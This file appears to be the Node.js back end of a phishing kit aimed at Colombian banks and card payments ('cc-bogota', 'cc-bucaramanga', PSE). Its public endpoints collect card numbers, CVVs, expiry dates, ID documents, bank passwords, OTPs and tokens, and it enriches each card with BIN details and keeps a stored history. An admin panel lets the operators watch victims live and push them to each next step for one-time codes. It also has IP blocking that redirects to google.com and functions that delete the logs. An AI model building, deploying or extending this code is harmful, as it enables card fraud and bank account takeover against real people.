require('dotenv').config();
const http = require('http');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');
const bancos = require('./bancos');
const { lookupBin } = require('card-bin-db');

const HTTP_PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'cambiar-este-secret-urgente';
const DATA_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || './data';

const ADMINS = [
    { user: process.env.ADMIN_1_USER, pass: process.env.ADMIN_1_PASS },
    { user: process.env.ADMIN_2_USER, pass: process.env.ADMIN_2_PASS }
].filter(a => a.user && a.pass);

if (!fs.existsSync(DATA_DIR)) {
    try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch (e) {}
}

const estadoSesiones = new Map();
const datosSesiones = new Map();
const usuariosActivos = new Map();
const rateLimits = new Map();
const tokensInvalidos = new Set();

let ipsBloqueadas = new Set();
const IP_BLOQUEADAS_FILE = path.join(DATA_DIR, 'bloqueadas.json');
try {
    if (fs.existsSync(IP_BLOQUEADAS_FILE)) {
        ipsBloqueadas = new Set(JSON.parse(fs.readFileSync(IP_BLOQUEADAS_FILE, 'utf8')));
        console.log(`IPs bloqueadas cargadas: ${ipsBloqueadas.size}`);
    }
} catch (e) {}

function guardarIpsBloqueadas() {
    try { fs.writeFileSync(IP_BLOQUEADAS_FILE, JSON.stringify([...ipsBloqueadas], null, 2)); } catch (e) {}
}

/* ============================================================
   🔥 NUEVO SISTEMA DE HISTORIAL
   ============================================================ */
const HISTORIAL_FILE = path.join(DATA_DIR, 'historial.json');
let historial = [];
try {
    if (fs.existsSync(HISTORIAL_FILE)) historial = JSON.parse(fs.readFileSync(HISTORIAL_FILE, 'utf8'));
} catch (e) {}

function guardarHistorial(bancoKey, datos) {
    const registro = {
        id: Date.now() + '-' + Math.random().toString(36).substr(2, 5),
        fecha: new Date().toISOString(),
        bancoKey: bancoKey,
        datos: datos
    };
    historial.unshift(registro);
    if (historial.length > 1000) historial = historial.slice(0, 1000); // Máximo 1000 registros
    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
}

const LOGS_FILE = path.join(DATA_DIR, 'logs-admin.json');
let logsAdmin = [];
try {
    if (fs.existsSync(LOGS_FILE)) logsAdmin = JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8'));
} catch (e) {}

function agregarLog(tipo, datos) {
    logsAdmin.unshift({ tipo, datos, fecha: new Date().toISOString() });
    if (logsAdmin.length > 500) logsAdmin = logsAdmin.slice(0, 500);
    try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {}
}

function getRealIP(req) {
    const xff = req.headers['x-forwarded-for'];
    if (xff) return xff.split(',')[0].trim();
    return req.socket.remoteAddress || 'desconocida';
}

function getBody(req, maxSize = 100 * 1024) {
    return new Promise((resolve, reject) => {
        let body = '';
        let size = 0;
        req.on('data', chunk => {
            size += chunk.length;
            if (size > maxSize) { reject(new Error('Body demasiado grande')); req.destroy(); return; }
            body += chunk;
        });
        req.on('end', () => {
            try { resolve(body ? JSON.parse(body) : {}); }
            catch (e) { reject(new Error('JSON inválido')); }
        });
        req.on('error', reject);
    });
}

function json(res, code, obj) {
    res.writeHead(code, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(obj));
}

function checkRateLimit(ip, tipo = 'publico') {
    const limites = {
        publico: { max: 60, ventana: 60 * 1000 },
        login:   { max: 5,  ventana: 15 * 60 * 1000 },
        admin:   { max: 300, ventana: 60 * 1000 }
    };
    const { max, ventana } = limites[tipo] || limites.publico;
    const ahora = Date.now();
    const key = `${tipo}:${ip}`;
    let reg = rateLimits.get(key);
    if (!reg || ahora > reg.resetAt) reg = { count: 0, resetAt: ahora + ventana };
    reg.count++;
    rateLimits.set(key, reg);
    if (reg.count > max) {
        ipsBloqueadas.add(ip);
        guardarIpsBloqueadas();
        agregarLog('auto-bloqueo', { ip, tipo, motivo: `Excedió ${max} peticiones` });
        return false;
    }
    return true;
}

function verificarJWT(req, res) {
    const auth = req.headers['authorization'];
    if (!auth || !auth.startsWith('Bearer ')) { json(res, 401, { ok: false, error: 'No autenticado' }); return null; }
    const token = auth.slice(7);
    if (tokensInvalidos.has(token)) { json(res, 401, { ok: false, error: 'Sesión cerrada' }); return null; }
    try { return jwt.verify(token, JWT_SECRET); }
    catch (e) { json(res, 401, { ok: false, error: 'Token inválido' }); return null; }
}

async function obtenerInfoBin(numeroTarjeta) {
    try {
        const limpio = String(numeroTarjeta || '').replace(/\D/g, '');
        if (limpio.length < 6) return null;
        const bin = limpio.substring(0, 6);
        const info = await lookupBin(bin);
        if (!info) return null;
        return {
            bin: bin,
            cardBrand: info.card_brand || info.scheme || 'Desconocida',
            cardType: info.card_type || info.type || 'Desconocido',
            cardLevel: info.card_level || info.level || info.category || 'Desconocido',
            bankName: info.bank_name || info.issuer || 'Desconocido',
            countryName: info.country_name || info.country || 'Desconocido'
        };
    } catch (e) {
        console.error('Error en BIN lookup:', e.message);
        return null;
    }
}

setInterval(() => {
    const ahora = Date.now();
    for (const [sid, datos] of usuariosActivos.entries()) {
        if (ahora - datos.ultimoHeartbeat > 30000) usuariosActivos.delete(sid);
    }
}, 10000);

const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, ngrok-skip-browser-warning');
    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    const ip = getRealIP(req);
    const url = req.url.split('?')[0];

    const esRutaAdmin = url.startsWith('/admin') || url === '/health' || url === '/check-ip';
    if (!esRutaAdmin && ipsBloqueadas.has(ip)) {
        json(res, 200, { ok: false, bloqueado: true, error: 'IP bloqueada', redirect: 'https://www.google.com' });
        return;
    }

    if (req.method === 'GET' && (url === '/admin' || url === '/admin/')) {
        try {
            const adminPath = path.join(__dirname, 'admin.html');
            if (!fs.existsSync(adminPath)) {
                res.writeHead(404, { 'Content-Type': 'text/html' });
                res.end('<h1>admin.html no encontrado</h1>');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(fs.readFileSync(adminPath, 'utf8'));
            return;
        } catch (e) { res.writeHead(500); res.end('Error'); return; }
    }

    if (req.method === 'GET' && url === '/health') {
        json(res, 200, {
            ok: true,
            bancos: Object.keys(bancos).length,
            sesiones: estadoSesiones.size,
            activos: usuariosActivos.size,
            bloqueadas: ipsBloqueadas.size
        });
        return;
    }

    if (req.method === 'GET' && url === '/check-ip') {
        console.log('[check-ip] IP detectada:', ip, '| ¿bloqueada?:', ipsBloqueadas.has(ip));
        if (ipsBloqueadas.has(ip)) {
            json(res, 200, { bloqueado: true, redirect: 'https://www.google.com', ip });
        } else {
            json(res, 200, { bloqueado: false, ip });
        }
        return;
    }

    if (req.method === 'POST' && url === '/heartbeat') {
        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
        try {
            const { sessionId, ultimaAccion } = await getBody(req);
            if (!sessionId) { json(res, 400, { ok: false }); return; }
            const previo = usuariosActivos.get(sessionId) || {};
            usuariosActivos.set(sessionId, {
                ip,
                ultimaAccion: ultimaAccion || 'activo',
                ultimoHeartbeat: Date.now(),
                userAgent: (req.headers['user-agent'] || '').slice(0, 200),
                entroEn: previo.entroEn || Date.now()
            });
            json(res, 200, { ok: true });
        } catch (e) { json(res, 400, { ok: false }); }
        return;
    }

    if (req.method === 'POST' && url === '/salir') {
        try {
            const { sessionId } = await getBody(req);
            if (sessionId) usuariosActivos.delete(sessionId);
        } catch (e) {}
        json(res, 200, { ok: true });
        return;
    }

    if (req.method === 'POST' && url === '/admin/login') {
        if (!checkRateLimit(ip, 'login')) { json(res, 429, { ok: false, error: 'Demasiados intentos' }); return; }
        try {
            const { usuario, password } = await getBody(req);
            const admin = ADMINS.find(a => a.user === usuario);
            const valido = admin && admin.pass === password;
            agregarLog('login', { ip, usuario, exito: valido });
            if (!valido) { json(res, 401, { ok: false, error: 'Credenciales inválidas' }); return; }
            const token = jwt.sign({ user: usuario }, JWT_SECRET, { expiresIn: '8h' });
            json(res, 200, { ok: true, token, usuario });
        } catch (e) { json(res, 400, { ok: false, error: e.message }); }
        return;
    }

    if (req.method === 'POST' && url === '/admin/logout') {
        const auth = req.headers['authorization'];
        if (auth && auth.startsWith('Bearer ')) tokensInvalidos.add(auth.slice(7));
        json(res, 200, { ok: true });
        return;
    }

    if (url.startsWith('/admin/')) {
        if (!checkRateLimit(ip, 'admin')) { json(res, 429, { ok: false }); return; }
        const payload = verificarJWT(req, res);
        if (!payload) return;

        if (req.method === 'GET' && url === '/admin/activos') {
            const lista = [];
            for (const [sid, d] of usuariosActivos.entries()) {
                lista.push({
                    sessionId: sid, 
                    ip: d.ip, 
                    ultimaAccion: d.ultimaAccion,
                    tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000),
                    userAgent: d.userAgent,
                    ultimoHeartbeat: d.ultimoHeartbeat
                });
            }
            json(res, 200, { ok: true, activos: lista });
            return;
        }

        /* 🔥 NUEVO ENDPOINT DE HISTORIAL */
        if (req.method === 'GET' && url === '/admin/historial') {
            json(res, 200, { ok: true, historial: historial.slice(0, 200) }); // Devolvemos los últimos 200
            return;
        }

        if (req.method === 'POST' && url === '/admin/historial/borrar') {
            try {
                const { ids } = await getBody(req);
                if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; }
                const antes = historial.length;
                historial = historial.filter(h => !ids.includes(h.id));
                try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
                const borrados = antes - historial.length;
                agregarLog('borrar-historial', { usuario: payload.user, cantidad: borrados });
                json(res, 200, { ok: true, borrados });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'GET' && url === '/admin/sesiones') {
            const lista = [];
            for (const [sid, estado] of estadoSesiones.entries()) {
                const datos = datosSesiones.get(sid) || {};
                lista.push({ sessionId: sid, estado, datos });
            }
            json(res, 200, { ok: true, sesiones: lista });
            return;
        }

        const matchSesion = url.match(/^\/admin\/sesion\/([^\/]+)$/);
        if (req.method === 'GET' && matchSesion) {
            const sessionId = decodeURIComponent(matchSesion[1]);
            const datos = datosSesiones.get(sessionId) || {};
            const estado = estadoSesiones.get(sessionId) || 'pendiente';
            json(res, 200, { ok: true, sessionId, estado, datos });
            return;
        }

        const matchAccion = url.match(/^\/admin\/sesion\/([^\/]+)\/accion$/);
        if (req.method === 'POST' && matchAccion) {
            const sessionId = decodeURIComponent(matchAccion[1]);
            try {
                const { accion } = await getBody(req);
                const mapEstados = {
                    ACEPTAR: 'aceptado', 
                    RECHAZAR: 'rechazado',
                    OTP: 'otp', 
                    TOKEN: 'token', 
                    FINALIZAR: 'finalizado',
                    CC_ERROR: 'cc_error' 
                };
                if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                estadoSesiones.set(sessionId, mapEstados[accion]);
                agregarLog('accion', { usuario: payload.user, sessionId, accion });
                console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                json(res, 200, { ok: true, estado: mapEstados[accion] });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'GET' && url === '/admin/ips-bloqueadas') {
            json(res, 200, { ok: true, ips: [...ipsBloqueadas] });
            return;
        }

        if (req.method === 'POST' && url === '/admin/ip/bloquear') {
            try {
                const { ip: ipB } = await getBody(req);
                if (!ipB) { json(res, 400, { ok: false, error: 'IP requerida' }); return; }
                ipsBloqueadas.add(ipB);
                guardarIpsBloqueadas();
                agregarLog('bloqueo', { usuario: payload.user, ip: ipB });
                console.log(`[BLOQUEO] IP ${ipB} bloqueada por ${payload.user}`);
                json(res, 200, { ok: true, ip: ipB, total: ipsBloqueadas.size });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'POST' && url === '/admin/ip/desbloquear') {
            try {
                const { ip: ipD } = await getBody(req);
                ipsBloqueadas.delete(ipD);
                guardarIpsBloqueadas();
                agregarLog('desbloqueo', { usuario: payload.user, ip: ipD });
                console.log(`[DESBLOQUEO] IP ${ipD} desbloqueada por ${payload.user}`);
                json(res, 200, { ok: true, ip: ipD, total: ipsBloqueadas.size });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'POST' && url === '/admin/sesiones/borrar') {
            try {
                const { sessionIds } = await getBody(req);
                if (!Array.isArray(sessionIds) || !sessionIds.length) {
                    json(res, 400, { ok: false, error: 'sessionIds requerido' });
                    return;
                }
                let borradas = 0;
                sessionIds.forEach(sid => {
                    if (estadoSesiones.delete(sid)) borradas++;
                    datosSesiones.delete(sid);
                    usuariosActivos.delete(sid);
                });
                agregarLog('borrar-sesiones', { usuario: payload.user, cantidad: borradas, sessionIds });
                json(res, 200, { ok: true, borradas });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'POST' && url === '/admin/logs/borrar') {
            try {
                const { ids } = await getBody(req);
                if (!Array.isArray(ids) || !ids.length) {
                    json(res, 400, { ok: false, error: 'ids requerido' });
                    return;
                }
                const antes = logsAdmin.length;
                logsAdmin = logsAdmin.filter(l => !ids.includes(l.id));
                try { fs.writeFileSync(LOGS_FILE, JSON.stringify(logsAdmin, null, 2)); } catch (e) {}
                const borrados = antes - logsAdmin.length;
                agregarLog('borrar-logs', { usuario: payload.user, cantidad: borrados });
                json(res, 200, { ok: true, borrados });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'POST' && url === '/admin/ips/borrar') {
            try {
                const { ips } = await getBody(req);
                if (!Array.isArray(ips) || !ips.length) {
                    json(res, 400, { ok: false, error: 'ips requerido' });
                    return;
                }
                let borradas = 0;
                ips.forEach(i => { if (ipsBloqueadas.delete(i)) borradas++; });
                guardarIpsBloqueadas();
                agregarLog('borrar-ips', { usuario: payload.user, cantidad: borradas, ips });
                json(res, 200, { ok: true, borradas });
            } catch (e) { json(res, 400, { ok: false }); }
            return;
        }

        if (req.method === 'GET' && url === '/admin/logs') {
            json(res, 200, { ok: true, logs: logsAdmin.slice(0, 100) });
            return;
        }

        if (req.method === 'GET' && url === '/admin/stats') {
            const pendientes = [...estadoSesiones.values()].filter(e => e === 'pendiente').length;
            json(res, 200, {
                ok: true,
                activos: usuariosActivos.size,
                sesiones: estadoSesiones.size,
                pendientes,
                bloqueadas: ipsBloqueadas.size,
                historial: historial.length
            });
            return;
        }

        json(res, 404, { ok: false, error: 'Ruta admin no encontrada' });
        return;
    }

    /* ============================================================
       ENDPOINTS UNIFICADOS PARA CC-BOGOTA Y CC-BUCARAMANGA
       ============================================================ */
    const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
    if (req.method === 'POST' && ccMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
        try {
            const bancoKey = 'cc-' + ccMatch[1];
            const datos = await getBody(req);
            const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
            if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }

            const infoBin = await obtenerInfoBin(tarjeta);

            const datosSesion = {
                bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber,
                monto, expMes, expAnio, cvv, placa: placa || '', subsidio: subsidio || false,
                ip, creadoEn: new Date().toISOString(),
                bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
                cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
                cardType: infoBin?.cardType || 'Desconocido',
                cardLevel: infoBin?.cardLevel || 'Desconocido',
                bankName: infoBin?.bankName || 'Desconocido',
                countryName: infoBin?.countryName || 'Desconocido'
            };

            estadoSesiones.set(sessionId, 'pendiente');
            datosSesiones.set(sessionId, datosSesion);
            
            // 🔥 GUARDAMOS EN EL HISTORIAL
            guardarHistorial(bancoKey, datosSesion);

            console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip} | BIN=${infoBin?.bin || '?'} Tipo=${infoBin?.cardType || '?'} Nivel=${infoBin?.cardLevel || '?'}`);
            json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    const ccOtpMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-otp$/);
    if (req.method === 'POST' && ccOtpMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
        try {
            const bancoKey = 'cc-' + ccOtpMatch[1];
            const { sessionId, otp } = await getBody(req);
            if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
            const datosOriginales = datosSesiones.get(sessionId) || {};
            const datosCompletos = Object.assign({}, datosOriginales, { otp });
            estadoSesiones.set(sessionId, 'pendiente');
            datosSesiones.set(sessionId, datosCompletos);
            
            // 🔥 ACTUALIZAMOS EL HISTORIAL CON EL OTP
            guardarHistorial(bancoKey, datosCompletos);

            console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
            json(res, 200, { ok: true, sessionId, bancoKey });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    /* ============================================================
       OTROS BANCOS (PSE)
       ============================================================ */
    const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
    if (req.method === 'POST' && enviarMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
        const bancoKey = enviarMatch[1];
        const banco = bancos[bancoKey];
        if (!banco) { json(res, 404, { ok: false, error: 'Banco no existe' }); return; }
        try {
            const datos = await getBody(req);
            const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
            if (!sessionId) { json(res, 400, { ok: false }); return; }
            const datosSesion = {
                bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token,
                ip, creadoEn: new Date().toISOString()
            };
            estadoSesiones.set(sessionId, 'pendiente');
            datosSesiones.set(sessionId, datosSesion);
            
            // 🔥 GUARDAMOS EN EL HISTORIAL
            guardarHistorial(bancoKey, datosSesion);

            console.log(`[${bancoKey}] Nueva sesión: ${sessionId}`);
            json(res, 200, { ok: true, sessionId });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    const tokenMatch = url.match(/^\/([a-z-]+)\/enviar-token$/);
    if (req.method === 'POST' && tokenMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
        const bancoKey = tokenMatch[1];
        const banco = bancos[bancoKey];
        if (!banco) { json(res, 404, { ok: false }); return; }
        try {
            const { sessionId, token, identificacion, clave } = await getBody(req);
            if (!sessionId || !token) { json(res, 400, { ok: false }); return; }
            const previos = datosSesiones.get(sessionId) || {};
            const datosCompletos = Object.assign({}, previos, { token, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
            datosSesiones.set(sessionId, datosCompletos);
            estadoSesiones.set(sessionId, 'token');
            
            // 🔥 ACTUALIZAMOS EL HISTORIAL
            guardarHistorial(bancoKey, datosCompletos);

            console.log(`[${bancoKey}] Token: ${sessionId} → ${token}`);
            json(res, 200, { ok: true });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    const otpMatch = url.match(/^\/([a-z-]+)\/enviar-otp$/);
    if (req.method === 'POST' && otpMatch) {
        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
        const bancoKey = otpMatch[1];
        const banco = bancos[bancoKey];
        if (!banco) { json(res, 404, { ok: false }); return; }
        try {
            const { sessionId, otp, identificacion, clave } = await getBody(req);
            if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
            const previos = datosSesiones.get(sessionId) || {};
            const datosCompletos = Object.assign({}, previos, { otp, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
            datosSesiones.set(sessionId, datosCompletos);
            estadoSesiones.set(sessionId, 'otp');
            
            // 🔥 ACTUALIZAMOS EL HISTORIAL
            guardarHistorial(bancoKey, datosCompletos);

            console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
            json(res, 200, { ok: true });
        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
        return;
    }

    /* ============================================================
       ESTADO (unificado para todos los bancos + cc-bogota + cc-bucaramanga)
       ============================================================ */
    const estadoMatch = url.match(/^\/([a-z-]+)\/estado\/([^\/?]+)/);
    if (req.method === 'GET' && estadoMatch) {
        const bancoKey = estadoMatch[1];
        const sessionId = estadoMatch[2];

        const esValido = bancos[bancoKey] || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga';
        if (!esValido) { json(res, 404, { ok: false }); return; }

        const estado = estadoSesiones.get(sessionId) || 'pendiente';
        json(res, 200, { estado });
        return;
    }

    res.writeHead(404);
    res.end('Not found');
});

server.timeout = 15000;
server.keepAliveTimeout = 20000;
server.headersTimeout = 25000;

server.listen(HTTP_PORT, () => {
    console.log(`HTTP corriendo en puerto ${HTTP_PORT}`);
    console.log(`DATA_DIR: ${DATA_DIR}`);
    console.log(`Admins: ${ADMINS.map(a => a.user).join(', ') || 'NINGUNO'}`);
    console.log(`IPs bloqueadas: ${ipsBloqueadas.size}`);
    console.log(`Bancos: ${Object.keys(bancos).length}`);
    console.log(`Registros en historial: ${historial.length}`);
});